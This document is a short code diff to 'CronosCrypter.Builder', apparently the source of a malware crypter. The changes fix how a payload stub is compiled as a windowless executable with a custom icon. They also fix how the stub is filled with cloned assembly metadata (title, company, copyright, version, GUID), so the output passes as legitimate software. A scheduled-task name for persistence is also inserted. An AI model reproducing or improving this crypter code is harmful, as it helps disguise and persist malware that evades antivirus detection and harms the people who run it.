@@ -81,7 +81,7 @@ namespace CronosCrypter.Builder
                     GenerateExecutable = true,
                     TreatWarningsAsErrors = false,
                     OutputAssembly = _settings.buildDirectory,
-                    CompilerOptions = "/optimize- /platform:x86 /unsafe /target:winexe" + iconPath,
+                    CompilerOptions = "/optimize- /platform:x86 /unsafe /target:winexe /win32icon:" + iconPath,
                     ReferencedAssemblies =
                     {
                         "System.dll",
@@ -131,14 +131,14 @@ namespace CronosCrypter.Builder
             stub = stub.Replace("[SCHTASKS]", _settings.schtasksName);
 
             // Assembly cloner
-            stub = stub.Replace("[AssemblyTitle]", this._settings.assemblyInfo.assemblyTitle);
-            stub = stub.Replace("[AssemblyDescription]", this._settings.assemblyInfo.assemblyDescription);
-            stub = stub.Replace("[AssemblyProduct]", this._settings.assemblyInfo.assemblyProductName);
-            stub = stub.Replace("[AssemblyCompany]", this._settings.assemblyInfo.assemblyCompany);
-            stub = stub.Replace("[AssemblyCopyright]", this._settings.assemblyInfo.assemblyCopyright);
-            stub = stub.Replace("[AssemblyTrademark]", this._settings.assemblyInfo.assemblyCopyright);
-            stub = stub.Replace("[AssemblyVersion]", this._settings.assemblyInfo.assemblyVersion ?? "1.0.0.0");
-            stub = stub.Replace("[Guid]", Guid.NewGuid().ToString());
+            stub = stub.Replace("#AssemblyTitle", _settings.assemblyInfo.assemblyTitle);
+            stub = stub.Replace("#AssemblyDescription", _settings.assemblyInfo.assemblyDescription);
+            stub = stub.Replace("#AssemblyProduct", _settings.assemblyInfo.assemblyProductName);
+            stub = stub.Replace("#AssemblyCompany", _settings.assemblyInfo.assemblyCompany);
+            stub = stub.Replace("#AssemblyCopyright", _settings.assemblyInfo.assemblyCopyright);
+            stub = stub.Replace("#AssemblyTrademark", _settings.assemblyInfo.assemblyCopyright);
+            stub = stub.Replace("#AssemblyVersion", _settings.assemblyInfo.assemblyVersion ?? "1.0.0.0");
+            stub = stub.Replace("#Guid", Guid.NewGuid().ToString());
 
             // Encryption type
             EncryptionType encryptionType = _settings.encryptionType;
